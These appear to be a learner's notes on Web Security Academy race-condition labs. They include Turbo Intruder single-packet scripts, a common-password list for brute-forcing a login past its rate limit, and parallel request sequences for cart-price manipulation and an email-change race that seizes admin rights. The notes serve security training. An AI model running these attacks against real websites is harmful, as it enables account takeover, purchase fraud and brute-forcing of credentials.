### Lab: Limit overrun race conditions

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.

You can log in to your account with the following credentials: wiener:peter. 

## Detecting and exploiting limit overrun race conditions with Turbo Intruder

To use the single-packet attack in Turbo Intruder:

-    Ensure that the target supports HTTP/2. The single-packet attack is incompatible with HTTP/1.
-    Set the `engine=Engine.BURP2` and `concurrentConnections=1` configuration options for the request engine.
-    When queueing your requests, group them by assigning them to a named gate using the gate argument for the `engine.queue()` method.
-    To send all of the requests in a given group, open the respective gate with the `engine.openGate()` method.

```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=1,
                            engine=Engine.BURP2
                            )
    
    # queue 20 requests in gate '1'
    for i in range(20):
        engine.queue(target.req, gate='1')
    
    # send all requests in gate '1' in parallel
    engine.openGate('1')
```        

For more details, see the `race-single-packet-attack.py` template provided in Turbo Intruder's default examples directory.

### Lab: Bypassing rate limits via race conditions

This lab's login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.

To solve the lab:

-    Work out how to exploit the race condition to bypass the rate limit.
-    Successfully brute-force the password for the user carlos.
-    Log in and access the admin panel.
-    Delete the user carlos.

You can log in to your account with the following credentials: wiener:peter. 
> 123123
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
1234567890
michael
x654321
superman
1qaz2wsx
baseball
7777777
121212
000000

Turbo Intruder script:
```py
def queueRequests(target, wordlists):

    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard
    
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```
The table give us the password

![alt text](image-13.png)
## Multi-endpoint race conditions

Perhaps the most intuitive form of these race conditions are those that involve sending requests to multiple endpoints at the same time.

Think about the classic logic flaw in online stores where you add an item to your basket or cart, pay for it, then add more items to the cart before force-browsing to the order confirmation page.

A variation of this vulnerability can occur when payment validation and order confirmation are performed during the processing of a single request. The state machine for the order status might look something like this:

![alt text](image-12.png)

In this case, you can potentially add more items to your basket during the race window between when the payment is validated and when the order is finally confirmed.

### Connection warming

Back-end connection delays don't usually interfere with race condition attacks because they typically delay parallel requests equally, so the requests stay in sync.

It's essential to be able to distinguish these delays from those caused by endpoint-specific factors. One way to do this is by "warming" the connection with one or more inconsequential requests to see if this smoothes out the remaining processing times. In Burp Repeater, you can try adding a GET request for the homepage to the start of your tab group, then using the Send group in sequence (single connection) option.

If the first request still has a longer processing time, but the rest of the requests are now processed within a short window, you can ignore the apparent delay and continue testing as normal.

If you still see inconsistent response times on a single endpoint, even when using the single-packet technique, this is an indication that the back-end delay is interfering with your attack. You may be able to work around this by using Turbo Intruder to send some connection warming requests before following up with your main attack requests.

### Lab: Multi-endpoint race conditions

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.

You can log into your account with the following credentials: wiener:peter. 

**Overview**:

- The website let user put an item in cart in `POST /cart` with the data, for example `productId=2&redir=PRODUCT&quantity=1`

- The user purchase the item in the cart in `POST /cart/checkout`, which request's have the session which have the user's cart

To solve the lab, first have a item that the given accout can purchase, then send 3 request in parallel
- `GET /` this is to warm the connection
- `POST /cart`, add the Lightweight L33t Leather Jacket, with the data `productId=1&redir=PRODUCT&quantity=1`
- `POST /cart/checkout`, to purchase the previous item, which will also purchase the item we just put with the race condition

By sending these requests in parallel, the checkout process might process the cart contents before the addition of the jacket is fully registered, effectively purchasing the jacket at the price of the cheaper item.

## Single-endpoint race conditions

Sending parallel requests with different values to a single endpoint can sometimes trigger powerful race conditions.

>For this attack to work, the different operations performed by each process must occur in just the right order. It would likely require multiple attempts, or a bit of luck, to achieve the desired outcome.

Email address confirmations, or any email-based operations, are generally a good target for single-endpoint race conditions. Emails are often sent in a background thread after the server issues the HTTP response to the client, making race conditions more likely. 

### Lab: Single-endpoint race conditions

This lab's email change feature contains a race condition that enables you to associate an arbitrary email address with your account.

Someone with the address carlos@ginandjuice.shop has a pending invite to be an administrator for the site, but they have not yet created an account. Therefore, any user who successfully claims this address will automatically inherit admin privileges.

To solve the lab:

-    Identify a race condition that lets you claim an arbitrary email address.
-    Change your email address to carlos@ginandjuice.shop.
-    Access the admin panel.
-    Delete the user carlos

You can log in to your own account with the following credentials: wiener:peter.

You also have access to an email client, where you can view all emails sent to `@exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net` addresses. 

For this challenge, send 2 request in parallel to solve the lab
```
POST /my-account/change-email

email=wiener@exploit-ID.exploit-server.net&csrf=....
```
```
POST /my-account/change-email

email=carlos@ginandjuice.shop&csrf=...
```

